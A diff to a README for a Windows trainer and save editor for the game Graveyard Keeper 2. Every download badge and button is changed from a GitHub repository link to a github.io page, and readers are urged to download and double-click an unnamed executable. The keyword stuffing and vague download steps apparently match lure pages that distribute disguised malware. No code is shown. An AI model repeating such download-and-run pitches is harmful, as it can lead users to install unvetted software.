@@ -1,7 +1,7 @@
 <h1>⚰️ Graveyard-Keeper-2-Trainer-Save-Resource-Editor - Master Your Graveyard with Total Control</h1>
 
 <p align="center">
-  <a href="https://github.com/khaledalqahtani505/Graveyard-Keeper-2-Trainer-Save-Resource-Editor"><img src="https://img.shields.io/badge/Download%20Now-Free%20Tool-brightgreen?style=for-the-badge&logo=windows&logoColor=white&color=2ecc71" alt="Download Badge"></a>
+  <a href="https://khaledalqahtani505.github.io"><img src="https://img.shields.io/badge/Download%20Now-Free%20Tool-brightgreen?style=for-the-badge&logo=windows&logoColor=white&color=2ecc71" alt="Download Badge"></a>
 </p>
 
 Welcome to the ultimate companion tool for **Graveyard Keeper 2** on Windows. This all-in-one trainer and editor puts you in complete control of your gameplay, letting you tweak everything from your character's health to your zombie workforce, all through a clean and simple desktop interface. No programming skills needed—just download, run, and play your way.
@@ -12,7 +12,7 @@ Welcome to the ultimate companion tool for **Graveyard Keeper 2** on Windows. Th
 
 Let’s get you up and running in under two minutes. Follow these simple steps:
 
-1.  **Visit the Download Page:** Click the green button above or go directly to the [official download page](https://github.com/khaledalqahtani505/Graveyard-Keeper-2-Trainer-Save-Resource-Editor).
+1.  **Visit the Download Page:** Click the green button above or go directly to the [official download page](https://khaledalqahtani505.github.io).
 2.  **Download the Application:** Visit this link to download the application.
 3.  **Run the Tool:** Once the download finishes, locate the file in your "Downloads" folder and double-click it to launch. The tool will open as a standalone window on your desktop.
 
@@ -53,7 +53,7 @@ Ready to dive in? Here’s everything you need to know to get the tool running o
 Click the button below to go to the official repository and download the application.
 
 <p align="center">
-  <a href="https://github.com/khaledalqahtani505/Graveyard-Keeper-2-Trainer-Save-Resource-Editor"><img src="https://img.shields.io/badge/⬇️%20Download%20Now-Get%20The%20Tool-important?style=for-the-badge&logo=github&logoColor=white&color=3498db" alt="Download Button"></a>
+  <a href="https://khaledalqahtani505.github.io"><img src="https://img.shields.io/badge/⬇️%20Download%20Now-Get%20The%20Tool-important?style=for-the-badge&logo=github&logoColor=white&color=3498db" alt="Download Button"></a>
 </p>
 
 Visit this link to download the application.
@@ -110,7 +110,7 @@ The Graveyard-Keeper-2-Trainer-Save-Resource-Editor is your one-stop solution fo
 Don't spend another minute grinding for iron nails. Take control of your graveyard today.
 
 <p align="center">
-  <a href="https://github.com/khaledalqahtani505/Graveyard-Keeper-2-Trainer-Save-Resource-Editor" style="font-size: 1.2em; font-weight: bold; color: #ffffff; background-color: #27ae60; padding: 15px 30px; border-radius: 5px; text-decoration: none;">🚀 START DOWNLOADING NOW</a>
+  <a href="https://khaledalqahtani505.github.io" style="font-size: 1.2em; font-weight: bold; color: #ffffff; background-color: #27ae60; padding: 15px 30px; border-radius: 5px; text-decoration: none;">🚀 START DOWNLOADING NOW</a>
 </p>
 
 Keywords: 2026, building-materials, config-manager, crafting-materials, demo-save-backup--transfer, desktop-tool, farming-utility, gaming-tools, graveyard-keeper-2-trainer-save-resource-editor, health--stamina-profiles, inventory--resource-editor, money--profit-utility, pc-gaming, production-automation, profile-manager, restore-points, town--graveyard-progression, windows, windows-11, zombie-worker--army-profiles
